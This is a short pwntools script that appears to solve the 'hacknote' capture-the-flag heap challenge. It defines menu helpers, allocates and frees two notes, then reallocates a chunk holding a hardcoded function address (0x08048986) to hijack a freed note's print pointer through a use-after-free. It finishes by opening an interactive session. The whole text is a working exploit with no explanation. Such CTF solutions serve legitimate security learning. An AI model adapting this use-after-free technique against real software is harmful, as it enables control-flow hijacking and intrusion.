from pwn import *

s = process("./hacknote")

elf = ELF("./hacknote")



def add(size,content):
	s.recvuntil(":")
	s.sendline("1")
	s.recvuntil("Note size :")
	s.sendline(str(size))
	s.recvuntil(":")
	s.send(content)
	

def delete(index):
	s.recvuntil(":")
	s.sendline("2")
	s.recvuntil(":")
	s.sendline(str(index))


def print_n(index):
	s.recvuntil(":")
	s.sendline("3")
	s.recvuntil(":")
	s.sendline(str(index))

def quit():
	s.recvuntil(":")
	s.sendline("4")



add(8,"A"*32)
add(32,"B"*32)

delete(0)
delete(1)

add(8,p32(0x08048986))

print_n(0)

s.interactive()
